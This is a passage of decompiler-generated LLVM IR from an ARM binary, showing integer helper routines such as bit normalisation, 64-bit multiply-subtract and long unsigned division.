  %v2_17630 = icmp ugt i32 %v1_17634, 255
  br i1 %v2_17630, label %bb15, label %.thread1

bb15:                                             ; preds = %.thread
  %v2_17634 = and i32 %v1_17634, 128
  %v3_17634 = icmp eq i32 %v2_17634, 0
  %v4_17634 = udiv i32 %v1_17634, 256
  store i32 %v4_17634, i32* %ip.global-to-local, align 4
  br i1 %v3_17634, label %.thread1, label %bb16

bb16:                                             ; preds = %bb15
  %v2_17638 = add nsw i32 %v1_17638, -8
  br label %.thread1

.thread1:                                         ; preds = %bb15, %.thread, %bb16
  %v1_17644 = phi i32 [ %v1_17638, %.thread ], [ %v1_17638, %bb15 ], [ %v2_17638, %bb16 ]
  %v1_17640 = phi i32 [ %v1_17634, %.thread ], [ %v4_17634, %bb15 ], [ %v4_17634, %bb16 ]
  %v2_1763c = icmp ugt i32 %v1_17640, 15
  br i1 %v2_1763c, label %bb17, label %.thread2

bb17:                                             ; preds = %.thread1
  %v2_17640 = and i32 %v1_17640, 8
  %v3_17640 = icmp eq i32 %v2_17640, 0
  %v4_17640 = udiv i32 %v1_17640, 16
  store i32 %v4_17640, i32* %ip.global-to-local, align 4
  br i1 %v3_17640, label %.thread2, label %bb18

bb18:                                             ; preds = %bb17
  %v2_17644 = add nsw i32 %v1_17644, -4
  br label %.thread2

.thread2:                                         ; preds = %bb17, %.thread1, %bb18
  %v1_1764c = phi i32 [ %v1_17644, %.thread1 ], [ %v1_17644, %bb17 ], [ %v2_17644, %bb18 ]
  %v1_17654 = phi i32 [ %v1_17640, %.thread1 ], [ %v4_17640, %bb17 ], [ %v4_17640, %bb18 ]
  %v2_17648 = icmp ugt i32 %v1_17654, 3
  br i1 %v2_17648, label %bb19, label %.thread3

bb19:                                             ; preds = %.thread2
  %v2_1764c = add nsw i32 %v1_1764c, -2
  br label %bb20

.thread3:                                         ; preds = %.thread2
  %v5_17650 = udiv i32 %v1_17654, 2
  %v6_17650 = sub i32 %v1_1764c, %v5_17650
  br label %bb20

bb20:                                             ; preds = %bb19, %.thread3
  %v0_17654 = phi i32 [ %v6_17650, %.thread3 ], [ %v2_1764c, %bb19 ]
  %v4_17654 = udiv i32 %v1_17654, 8
  %v5_17654 = sub i32 %v0_17654, %v4_17654
  %tmp = mul i32 %v5_17654, -8388608
  %v5_17658 = add i32 %v1_1761c, %tmp
  %v5_1765c = icmp slt i32 %v0_17654, %v4_17654
  br i1 %v5_1765c, label %dec_label_pc_1767c, label %dec_label_pc_17660

dec_label_pc_17660:                               ; preds = %bb20
  %v7_17660 = shl i32 %v0_175d0, %v5_17654
  %v8_17660 = add i32 %v5_17658, %v7_17660
  store i32 0, i32* %ip.global-to-local, align 4
  %v25_17670 = icmp eq i32 %v8_17660, 0
  br i1 %v25_17670, label %bb21, label %bb22

bb21:                                             ; preds = %dec_label_pc_17660
  br label %bb22

bb22:                                             ; preds = %bb23, %dec_label_pc_1767c, %dec_label_pc_17660, %bb21
  %v1_17678 = phi i32 [ %v8_17660, %dec_label_pc_17660 ], [ 0, %bb21 ], [ %v11_1768c, %dec_label_pc_1767c ], [ 0, %bb23 ]
  ret i32 %v1_17678

dec_label_pc_1767c:                               ; preds = %bb20
  %v1_1767c = add i32 %v5_17654, 32
  %v6_17680 = shl i32 %v0_175d0, %v1_1767c
  store i32 %v6_17680, i32* %ip.global-to-local, align 4
  %v1_17684 = sub i32 0, %v5_17654
  %v3_1768c = sub i32 -1, %v5_17654
  %v4_1768c = shl i32 1, %v3_1768c
  %v5_1768c = and i32 %v4_1768c, %v0_175d0
  %v6_1768c = icmp ne i32 %v5_1768c, 0
  %v7_1768c = lshr i32 %v0_175d0, %v1_17684
  %v9_1768c = add i32 %v5_17658, %v7_1768c
  %v10_1768c = zext i1 %v6_1768c to i32
  %v11_1768c = add i32 %v10_1768c, %v9_1768c
  %v25_1768c = icmp eq i32 %v11_1768c, 0
  br i1 %v25_1768c, label %bb23, label %bb22

bb23:                                             ; preds = %dec_label_pc_1767c
  br label %bb22

; uselistorder directives
  uselistorder i32 %v11_1768c, { 1, 0 }
  uselistorder i32 %v5_17658, { 1, 0 }
  uselistorder i32 %v5_17654, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_17654, { 1, 0 }
  uselistorder i32 %v0_17654, { 1, 0 }
  uselistorder i32 %v4_17640, { 2, 1, 0 }
  uselistorder i32 %v1_17640, { 1, 0, 2, 3 }
  uselistorder i32 %v4_17634, { 2, 1, 0 }
  uselistorder i32 %v1_17634, { 1, 0, 2, 3 }
  uselistorder i32 %v4_17628, { 2, 1, 0 }
  uselistorder i32 %v0_17624, { 1, 0, 2, 3 }
  uselistorder i32 %v0_175d0, { 1, 0, 2, 3 }
  uselistorder i32 3, { 64, 0, 24, 113, 37, 125, 114, 115, 116, 2, 117, 65, 66, 67, 68, 69, 70, 63, 118, 5, 119, 120, 126, 121, 71, 122, 72, 38, 77, 25, 78, 26, 79, 3, 80, 81, 82, 39, 6, 106, 40, 107, 41, 108, 27, 109, 42, 110, 43, 111, 44, 83, 84, 45, 85, 46, 28, 88, 47, 48, 49, 50, 1, 86, 87, 51, 8, 7, 52, 89, 29, 90, 10, 9, 53, 30, 91, 12, 11, 54, 92, 31, 93, 14, 13, 55, 94, 32, 95, 16, 15, 56, 96, 33, 97, 58, 98, 18, 17, 57, 99, 34, 100, 20, 19, 59, 101, 35, 102, 22, 21, 60, 103, 36, 104, 23, 105, 4, 112, 123, 73, 74, 75, 76, 61, 124, 62 }
  uselistorder i32 -4, { 6, 5, 23, 0, 21, 24, 25, 26, 7, 8, 1, 9, 10, 11, 12, 13, 14, 15, 2, 22, 16, 3, 27, 18, 19, 20, 4, 17 }
  uselistorder i32 15, { 11, 19, 0, 12, 13, 3, 14, 18, 4, 5, 6, 7, 8, 9, 1, 15, 10, 16, 2, 17 }
  uselistorder i32 -8, { 12, 11, 21, 13, 14, 15, 16, 17, 10, 18, 19, 20, 9, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 256, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 38, 39, 36, 41, 42, 43, 40, 44, 105, 45, 113, 114, 46, 47, 48, 115, 49, 50, 51, 52, 53, 54, 106, 116, 107, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 108, 110, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 109, 111, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 112, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 117, 104, 118 }
  uselistorder i32 128, { 19, 8, 18, 17, 20, 16, 15, 14, 13, 12, 24, 0, 25, 22, 21, 9, 10, 23, 11, 2, 3, 4, 5, 6, 7, 26, 1, 27 }
  uselistorder i32 7, { 2, 1, 0, 39, 40, 41, 7, 43, 44, 16, 45, 17, 46, 5, 18, 56, 19, 57, 20, 58, 21, 59, 22, 60, 23, 61, 24, 62, 25, 63, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 47, 8, 48, 9, 10, 49, 36, 50, 11, 51, 12, 52, 13, 53, 14, 54, 6, 55, 3, 37, 64, 4, 38, 65, 66, 42, 15, 67 }
  uselistorder i32 23, { 1, 2, 0, 12, 13, 18, 22, 4, 14, 6, 15, 7, 16, 8, 17, 5, 19, 3, 20, 9, 21, 10, 11 }
  uselistorder label %bb22, { 0, 1, 3, 2 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %.thread1, { 2, 0, 1 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @function_17698(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_17698:
  %v0_176a0 = call i32 @function_176b4()
  ret i32 %v0_176a0
}

define i32 @function_176b4() local_unnamed_addr {
dec_label_pc_176b4:
  %sl.global-to-local = alloca i32, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %v3_176b4 = load i32, i32* @r4, align 4
  store i32 %v3_176b4, i32* %stack_var_-32, align 4
  %v12_176b4 = load i32, i32* @r7, align 4
  %v21_176b4 = load i32, i32* @sl, align 4
  %v0_176b8 = load i32, i32* @r2, align 4
  store i32 %v0_176b8, i32* @r7, align 4
  %v0_176bc = load i32, i32* @r3, align 4
  store i32 %v0_176bc, i32* @r8, align 4
  %v0_176c0 = load i32, i32* @r0, align 4
  store i32 %v0_176c0, i32* @sb, align 4
  %v0_176c4 = load i32, i32* @r1, align 4
  store i32 %v0_176c4, i32* @sl, align 4
  %v0_176c8 = call i32 @function_17ce4()
  %v1_176c8 = sext i32 %v0_176c8 to i64
  %v2_176cc = load i32, i32* @r8, align 4
  %v3_176cc = mul i32 %v2_176cc, %v0_176c8
  store i32 %v3_176cc, i32* @ip, align 4
  %v3_176d0 = load i32, i32* @r7, align 4
  %v4_176d0 = zext i32 %v3_176d0 to i64
  %v5_176d0 = mul nuw nsw i64 %v4_176d0, %v1_176c8
  %v6_176d0 = udiv i64 %v5_176d0, 4294967296
  %v7_176d0 = trunc i64 %v6_176d0 to i32
  %v8_176d0 = trunc i64 %v5_176d0 to i32
  %v1_176d4 = load i32, i32* @r1, align 4
  %v3_176d4 = mul i32 %v1_176d4, %v3_176d0
  %v4_176d4 = add i32 %v3_176d4, %v3_176cc
  %v2_176d8 = add i32 %v4_176d4, %v7_176d0
  %v0_176e0 = load i32, i32* @sb, align 4
  %v2_176e0 = sub i32 %v0_176e0, %v8_176d0
  %v3_176e0 = icmp uge i32 %v0_176e0, %v8_176d0
  %v0_176e4 = load i32, i32* @sl, align 4
  %v3_176e4 = icmp eq i1 %v3_176e0, false
  %v4_176e4 = sub i32 %v0_176e4, %v2_176d8
  %v6_176e4 = sext i1 %v3_176e4 to i32
  %v7_176e4 = add i32 %v6_176e4, %v4_176e4
  store i32 %v7_176e4, i32* %sl.global-to-local, align 4
  %v1_176f0 = inttoptr i32 %tmp7 to i32*
  store i32 %v2_176e0, i32* %v1_176f0, align 4
  %v3_176f0 = add i32 %tmp7, 4
  %v4_176f0 = inttoptr i32 %v3_176f0 to i32*
  %v5_176f0 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v5_176f0, i32* %v4_176f0, align 4
  %v2_176f4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_176f4, i32* @r4, align 4
  store i32 %v12_176b4, i32* @r7, align 4
  store i32 %v21_176b4, i32* @sl, align 4
  ret i32 %v0_176c8

; uselistorder directives
  uselistorder i32 %v8_176d0, { 1, 0 }
  uselistorder i64 %v5_176d0, { 1, 0 }
  uselistorder i32 %v0_176c8, { 1, 0, 2 }
  uselistorder i32 %tmp7, { 1, 0 }
}

define i32 @function_176fc(i32 %arg1, i32 %arg2, i64 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_176fc:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @r3, align 4
  %tmp = trunc i64 %arg3 to i32
  store i32 %tmp, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v21_176fc = load i32, i32* @sl, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg1, i32* @sb, align 4
  store i32 %arg2, i32* @sl, align 4
  %v0_17710 = call i32 @function_17744()
  %v1_17714 = load i32, i32* @r8, align 4
  %v2_17714 = mul i32 %v1_17714, %v0_17710
  %v1_17718 = zext i32 %v0_17710 to i64
  %v2_17718 = load i32, i32* @r7, align 4
  %v3_17718 = zext i32 %v2_17718 to i64
  %v4_17718 = mul nuw i64 %v3_17718, %v1_17718
  %v5_17718 = udiv i64 %v4_17718, 4294967296
  %v6_17718 = trunc i64 %v5_17718 to i32
  %v7_17718 = trunc i64 %v4_17718 to i32
  %v3_1771c = mul i32 %v2_17718, %arg2
  %v4_1771c = add i32 %v3_1771c, %v2_17714
  %v2_17720 = add i32 %v4_1771c, %v6_17718
  %v0_17728 = load i32, i32* @sb, align 4
  %v2_17728 = sub i32 %v0_17728, %v7_17718
  %v3_17728 = icmp uge i32 %v0_17728, %v7_17718
  %v0_1772c = load i32, i32* @sl, align 4
  %v3_1772c = icmp eq i1 %v3_17728, false
  %v4_1772c = sub i32 %v0_1772c, %v2_17720
  %v6_1772c = sext i1 %v3_1772c to i32
  %v7_1772c = add i32 %v6_1772c, %v4_1772c
  store i32 %v7_1772c, i32* %sl.global-to-local, align 4
  %v1_17738 = inttoptr i32 %arg5 to i32*
  store i32 %v2_17728, i32* %v1_17738, align 4
  %v3_17738 = add i32 %arg5, 4
  %v4_17738 = inttoptr i32 %v3_17738 to i32*
  %v5_17738 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v5_17738, i32* %v4_17738, align 4
  store i32 %v21_176fc, i32* %sl.global-to-local, align 4
  ret i32 %v0_17710

; uselistorder directives
  uselistorder i32 %v7_17718, { 1, 0 }
  uselistorder i64 %v4_17718, { 1, 0 }
  uselistorder i32 %v0_17710, { 1, 2, 0 }
  uselistorder i32* @sb, { 6, 7, 102, 103, 8, 9, 104, 105, 107, 106, 109, 108, 110, 111, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 10, 112, 113, 114, 115, 116, 117, 118, 119, 120, 127, 128, 135, 136, 137, 138, 139, 129, 130, 1, 131, 2, 132, 133, 0, 134, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 121, 122, 123, 124, 23, 24, 25, 26, 27, 28, 29, 21, 22, 3, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 4, 57, 74, 75, 76, 77, 78, 79, 80, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 125, 126, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 5, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172 }
  uselistorder i32* @r8, { 18, 19, 131, 132, 231, 232, 233, 39, 0, 40, 41, 157, 158, 159, 160, 133, 134, 136, 135, 138, 137, 139, 140, 20, 161, 162, 163, 164, 165, 166, 234, 235, 236, 1, 237, 238, 239, 2, 240, 241, 21, 141, 142, 143, 144, 4, 145, 146, 147, 167, 168, 169, 170, 5, 193, 194, 195, 196, 197, 198, 199, 6, 16, 206, 171, 172, 173, 174, 175, 176, 177, 178, 187, 188, 7, 189, 190, 8, 191, 192, 179, 180, 181, 9, 182, 183, 184, 185, 186, 200, 10, 201, 202, 203, 204, 205, 242, 243, 22, 23, 24, 25, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 27, 148, 149, 150, 151, 51, 52, 11, 53, 54, 55, 56, 17, 57, 71, 72, 73, 77, 74, 75, 76, 78, 79, 42, 43, 44, 45, 46, 47, 48, 49, 50, 60, 58, 59, 15, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 80, 12, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 13, 118, 119, 120, 121, 122, 3, 123, 124, 125, 126, 128, 127, 129, 130, 152, 153, 154, 155, 156, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 14, 226, 227, 228, 229, 230 }
  uselistorder i32* @sl, { 11, 12, 13, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 2, 134, 135, 136, 137, 138, 139, 3, 140, 141, 158, 159, 245, 246, 247, 248, 142, 143, 144, 145, 146, 147, 148, 149, 150, 160, 5, 173, 174, 0, 4, 181, 182, 183, 161, 162, 6, 169, 170, 171, 172, 163, 164, 165, 166, 167, 168, 175, 176, 177, 178, 179, 180, 249, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25, 26, 27, 29, 28, 22, 151, 152, 153, 154, 36, 7, 1, 37, 38, 39, 30, 31, 32, 33, 34, 35, 8, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 81, 72, 73, 74, 75, 76, 77, 78, 79, 80, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 9, 117, 118, 119, 155, 156, 157, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 227, 224, 225, 226, 228, 229, 230, 231, 232, 233, 234, 236, 237, 235, 10, 238, 239, 240, 241, 242, 243, 244 }
  uselistorder i32 %arg5, { 1, 0 }
}

define i32 @function_17744() local_unnamed_addr {
dec_label_pc_17744:
  %fp.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v12_17744 = load i32, i32* @r7, align 4
  %v27_17744 = load i32, i32* @lr, align 4
  store i32 43936, i32* %r8.global-to-local, align 4
  %v0_17750 = load i32, i32* @r1, align 4
  %v1_17750 = icmp slt i32 %v0_17750, 0
  br i1 %v1_17750, label %dec_label_pc_17ad8, label %dec_label_pc_17778

dec_label_pc_17778:                               ; preds = %dec_label_pc_17744
  store i32 0, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_2230c.695 to i32), i32* %r8.global-to-local, align 4
  %v0_17768 = load i32, i32* @r2, align 4
  store i32 %v0_17768, i32* @r4, align 4
  %v0_1776c = load i32, i32* @r3, align 4
  %v1_17778 = icmp slt i32 %v0_1776c, 0
  br i1 %v1_17778, label %dec_label_pc_17af0, label %dec_label_pc_17780

dec_label_pc_17780:                               ; preds = %dec_label_pc_17ad8, %dec_label_pc_17778, %dec_label_pc_17af0
  %v0_1776c90 = phi i32 [ %v0_1776c89, %dec_label_pc_17af0 ], [ %v0_1776c85, %dec_label_pc_17ad8 ], [ %v0_1776c, %dec_label_pc_17778 ]
  %v1_17ac0 = phi i32 [ %v6_17af4, %dec_label_pc_17af0 ], [ %v0_1776c85, %dec_label_pc_17ad8 ], [ %v0_1776c, %dec_label_pc_17778 ]
  %v0_177c860 = phi i32 [ %stack_var_-56.2, %dec_label_pc_17af0 ], [ -1, %dec_label_pc_17ad8 ], [ 0, %dec_label_pc_17778 ]
  %v0_178d4 = phi i32 [ %v1_17af0, %dec_label_pc_17af0 ], [ %v0_1776884, %dec_label_pc_17ad8 ], [ %v0_17768, %dec_label_pc_17778 ]
  %v1_177cc = phi i32 [ %v0_1778428, %dec_label_pc_17af0 ], [ %v6_17adc, %dec_label_pc_17ad8 ], [ %v0_17750, %dec_label_pc_17778 ]
  %stack_var_-56.1 = phi i32 [ %v1_17afc, %dec_label_pc_17af0 ], [ -1, %dec_label_pc_17ad8 ], [ 0, %dec_label_pc_17778 ]
  %v2_17780 = icmp eq i32 %v1_17ac0, 0
  store i32 %v1_177cc, i32* @r7, align 4
  store i32 %v0_178d4, i32* %r6.global-to-local, align 4
  %v0_1778c = load i32, i32* @r0, align 4
  store i32 %v0_1778c, i32* %sb.global-to-local, align 4
  br i1 %v2_17780, label %dec_label_pc_17794, label %dec_label_pc_1788c

dec_label_pc_17794:                               ; preds = %dec_label_pc_17780
  %tmp = icmp ugt i32 %v0_178d4, %v1_177cc
  br i1 %tmp, label %dec_label_pc_1779c, label %dec_label_pc_178cc

dec_label_pc_1779c:                               ; preds = %dec_label_pc_17794
  %v2_1779c = icmp ugt i32 %v0_178d4, 65535
  br i1 %v2_1779c, label %dec_label_pc_17c7c, label %dec_label_pc_177a4

dec_label_pc_177a4:                               ; preds = %dec_label_pc_1779c
  %v2_177a4 = icmp ugt i32 %v0_178d4, 254
  %v7_177a4 = icmp eq i32 %v0_178d4, 255
  %v2_177a8 = xor i1 %v7_177a4, true
  %v3_177a8 = and i1 %v2_177a4, %v2_177a8
  br i1 %v3_177a8, label %bb, label %bb123

bb:                                               ; preds = %dec_label_pc_177a4
  br label %bb123

bb123:                                            ; preds = %dec_label_pc_177a4, %bb
  %v0_177c858 = phi i32 [ %v0_177c860, %dec_label_pc_177a4 ], [ 24, %bb ]
  %v2_177ac = xor i1 %v2_177a4, true
  %v3_177ac = or i1 %v7_177a4, %v2_177ac
  br i1 %v3_177ac, label %bb124, label %.thread94

bb124:                                            ; preds = %bb123
  br label %.thread94

.thread94:                                        ; preds = %bb123, %bb124
  %v0_177c85792 = phi i32 [ 32, %bb124 ], [ %v0_177c858, %bb123 ]
  %v1_177b853 = phi i32 [ 0, %bb124 ], [ %v0_1776c90, %bb123 ]
  br i1 %v3_177a8, label %bb125, label %bb126

bb125:                                            ; preds = %.thread94
  br label %bb126

bb126:                                            ; preds = %bb186, %bb185, %.thread94, %bb125
  %v0_177c8 = phi i32 [ 16, %bb186 ], [ %v0_177c859, %bb185 ], [ %v0_177c85792, %.thread94 ], [ %v0_177c85792, %bb125 ]
  %v1_177b8 = phi i32 [ %v1_177b854, %bb186 ], [ %v1_177b854, %bb185 ], [ %v1_177b853, %.thread94 ], [ 8, %bb125 ]
  %v6_177b8 = lshr i32 %v0_178d4, %v1_177b8
  %v4_177c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2230c.695 to i32), i32 36) to i32*), align 4
  %v2_177c4 = add i32 %v4_177c0, %v6_177b8
  %v3_177c4 = inttoptr i32 %v2_177c4 to i8*
  %v4_177c4 = load i8, i8* %v3_177c4, align 1
  %v6_177c4 = zext i8 %v4_177c4 to i32
  %v2_177c8 = sub nsw i32 %v0_177c8, %v6_177c4
  %v9_177c8 = icmp eq i32 %v0_177c8, %v6_177c4
  br i1 %v9_177c8, label %.thread2.thread20, label %bb128

.thread2.thread20:                                ; preds = %bb126
  %v3_177dc24 = udiv i32 %v0_178d4, 65536
  store i32 %v3_177dc24, i32* %r8.global-to-local, align 4
  br label %bb129

bb128:                                            ; preds = %bb126
  %v7_177cc = shl i32 %v1_177cc, %v2_177c8
  %v2_177d0 = sub i32 32, %v2_177c8
  %v7_177d4 = shl i32 %v0_178d4, %v2_177c8
  store i32 %v7_177d4, i32* %r6.global-to-local, align 4
  %v8_177d8 = lshr i32 %v0_1778c, %v2_177d0
  %v9_177d8 = or i32 %v8_177d8, %v7_177cc
  store i32 %v9_177d8, i32* @r7, align 4
  %v3_177dc = udiv i32 %v7_177d4, 65536
  store i32 %v3_177dc, i32* %r8.global-to-local, align 4
  %v7_177e0 = shl i32 %v0_1778c, %v2_177c8
  store i32 %v7_177e0, i32* %sb.global-to-local, align 4
  br label %bb129

bb129:                                            ; preds = %.thread2.thread20, %bb128
  %v0_177e8 = phi i32 [ %v3_177dc24, %.thread2.thread20 ], [ %v3_177dc, %bb128 ]
  %v0_177e4 = phi i32 [ %v1_177cc, %.thread2.thread20 ], [ %v9_177d8, %bb128 ]
  store i32 %v0_177e4, i32* @r0, align 4
  store i32 %v0_177e8, i32* @r1, align 4
  %v0_177ec = call i32 @function_1296c()
  %v0_177f0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_177ec, i32* %sl.global-to-local, align 4
  %v0_177f8 = load i32, i32* @r7, align 4
  %v2_177fc = call i32 @function_12a68(i32 %v0_177f8, i32 %v0_177f0)
  %v0_17800 = load i32, i32* %r6.global-to-local, align 4
  %v3_17804 = urem i32 %v0_17800, 65536
  store i32 %v3_17804, i32* @r7, align 4
  %v2_17808 = mul i32 %v0_177ec, %v3_17804
  %v0_1780c = load i32, i32* %sb.global-to-local, align 4
  %v3_1780c = udiv i32 %v0_1780c, 65536
  %v4_17810 = mul i32 %v0_177f0, 65536
  %v5_17810 = or i32 %v3_1780c, %v4_17810
  %tmp191 = icmp ugt i32 %v2_17808, %v5_17810
  br i1 %tmp191, label %dec_label_pc_1781c, label %.thread95

dec_label_pc_1781c:                               ; preds = %bb129
  %v2_1781c = add i32 %v5_17810, %v0_17800
  %v3_1781c = icmp ult i32 %v2_1781c, %v5_17810
  %v1_17820 = add i32 %v0_177ec, -1
  store i32 %v1_17820, i32* %sl.global-to-local, align 4
  br i1 %v3_1781c, label %.thread95, label %dec_label_pc_17828

dec_label_pc_17828:                               ; preds = %dec_label_pc_1781c
  %tmp192 = icmp ugt i32 %v2_17808, %v2_1781c
  br i1 %tmp192, label %bb130, label %.thread95

bb130:                                            ; preds = %dec_label_pc_17828
  %v5_1782c = add i32 %v0_177ec, -2
  store i32 %v5_1782c, i32* %sl.global-to-local, align 4
  %v6_17830 = add i32 %v2_1781c, %v0_17800
  br label %.thread95

.thread95:                                        ; preds = %bb129, %dec_label_pc_17828, %dec_label_pc_1781c, %bb130
  %v1_17834 = phi i32 [ %v2_1781c, %dec_label_pc_1781c ], [ %v5_17810, %bb129 ], [ %v6_17830, %bb130 ], [ %v2_1781c, %dec_label_pc_17828 ]
  %v2_17834 = sub i32 %v1_17834, %v2_17808
  store i32 %v2_17834, i32* @r4, align 4
  %v0_17838 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_17838, i32* @r1, align 4
  store i32 %v2_17834, i32* @r0, align 4
  %v0_17840 = call i32 @function_1296c()
  store i32 %v0_17840, i32* @r5, align 4
  %v0_1784c = load i32, i32* @r4, align 4
  %v2_17850 = call i32 @function_12a68(i32 %v0_1784c, i32 %v0_17838)
  %v0_17854 = load i32, i32* @r7, align 4
  %v1_17854 = load i32, i32* @r5, align 4
  %v2_17854 = mul i32 %v1_17854, %v0_17854
  %v0_17858 = load i32, i32* %sb.global-to-local, align 4
  %v3_1785c = urem i32 %v0_17858, 65536
  %v4_17860 = mul i32 %v0_17838, 65536
  %v5_17860 = or i32 %v3_1785c, %v4_17860
  %tmp193 = icmp ugt i32 %v2_17854, %v5_17860
  br i1 %tmp193, label %dec_label_pc_1786c, label %bb132

dec_label_pc_1786c:                               ; preds = %.thread95
  %v1_1786c = load i32, i32* %r6.global-to-local, align 4
  %v2_1786c = add i32 %v1_1786c, %v5_17860
  %v3_1786c = icmp ult i32 %v2_1786c, %v5_17860
  %v1_17870 = add i32 %v1_17854, -1
  br i1 %v3_1786c, label %bb132, label %dec_label_pc_17878

dec_label_pc_17878:                               ; preds = %dec_label_pc_1786c
  %tmp194 = icmp ugt i32 %v2_17854, %v2_1786c
  br i1 %tmp194, label %bb131, label %bb132

bb131:                                            ; preds = %dec_label_pc_17878
  %v5_1787c = add i32 %v1_17854, -2
  br label %bb132

bb132:                                            ; preds = %.thread95, %dec_label_pc_1786c, %dec_label_pc_17878, %bb131
  %v0_17880 = phi i32 [ %v1_17870, %dec_label_pc_1786c ], [ %v1_17854, %.thread95 ], [ %v1_17870, %dec_label_pc_17878 ], [ %v5_1787c, %bb131 ]
  %v1_17880 = load i32, i32* %sl.global-to-local, align 4
  %v4_17880 = mul i32 %v1_17880, 65536
  %v5_17880 = or i32 %v4_17880, %v0_17880
  br label %dec_label_pc_178a0

dec_label_pc_1788c:                               ; preds = %dec_label_pc_17780
  %v9_1788c = icmp eq i32 %v1_177cc, %v1_17ac0
  %tmp195 = icmp ult i32 %v1_177cc, %v1_17ac0
  br i1 %tmp195, label %dec_label_pc_17898, label %dec_label_pc_17a88

dec_label_pc_17898:                               ; preds = %bb156, %dec_label_pc_1788c, %bb157
  br label %dec_label_pc_178a0

dec_label_pc_178a0:                               ; preds = %.thread13, %bb178, %dec_label_pc_17c70, %bb145, %bb132, %dec_label_pc_17898
  %v0_178b8 = phi i32 [ %v5_17c14, %bb178 ], [ 1, %.thread13 ], [ %v1_17c70, %dec_label_pc_17c70 ], [ %v5_17a7c, %bb145 ], [ %v5_17880, %bb132 ], [ 0, %dec_label_pc_17898 ]
  %v2_178ac = icmp eq i32 %stack_var_-56.1, 0
  br i1 %v2_178ac, label %dec_label_pc_178c0, label %dec_label_pc_178b8

dec_label_pc_178b8:                               ; preds = %dec_label_pc_178a0
  %v1_178b8 = sub i32 0, %v0_178b8
  br label %dec_label_pc_178c0

dec_label_pc_178c0:                               ; preds = %dec_label_pc_178a0, %dec_label_pc_178b8
  %v1_178c8 = phi i32 [ %v0_178b8, %dec_label_pc_178a0 ], [ %v1_178b8, %dec_label_pc_178b8 ]
  store i32 %v12_17744, i32* @r7, align 4
  ret i32 %v1_178c8

dec_label_pc_178cc:                               ; preds = %dec_label_pc_17794
  %v2_178cc = icmp eq i32 %v0_178d4, 0
  br i1 %v2_178cc, label %dec_label_pc_178d4, label %dec_label_pc_178e4

dec_label_pc_178d4:                               ; preds = %dec_label_pc_178cc
  store i32 0, i32* @r1, align 4
  store i32 1, i32* @r0, align 4
  %v0_178dc = call i32 @function_1296c()
  store i32 %v0_178dc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_178e4

dec_label_pc_178e4:                               ; preds = %dec_label_pc_178cc, %dec_label_pc_178d4
  %v0_17934 = phi i32 [ %v0_178d4, %dec_label_pc_178cc ], [ %v0_178dc, %dec_label_pc_178d4 ]
  %v3_178e8 = icmp ult i32 %v0_17934, 65534
